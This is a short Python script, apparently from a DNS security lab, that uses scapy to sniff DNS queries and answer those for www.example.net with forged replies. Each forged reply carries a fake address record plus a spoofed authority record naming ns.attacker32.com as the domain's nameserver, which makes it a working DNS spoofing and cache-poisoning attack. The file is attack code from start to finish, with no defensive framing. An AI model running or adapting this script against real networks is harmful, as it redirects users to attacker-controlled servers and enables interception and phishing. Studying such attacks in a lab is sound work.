#!/usr/bin/python3
#!/usr/bin/python3
from scapy.all import *


def spoof_dns(pkt):
    if DNS in pkt and b'www.example.net' in pkt[DNS].qd.qname:
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=53)
        an1 = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='202.120.224.115')
        # The Authority Section
        ns1 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns.attacker32.com') 
        # The Additional Section
        ar1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='202.120.224.26') 
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
         qdcount=1, ancount=1, nscount=1, arcount=1, 
         an=an1, ns=ns1, ar=ar1)
        spoofpkt = ip/udp/dns
        send(spoofpkt)


# Sniff UDP query packets and invoke spoof_dns().
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
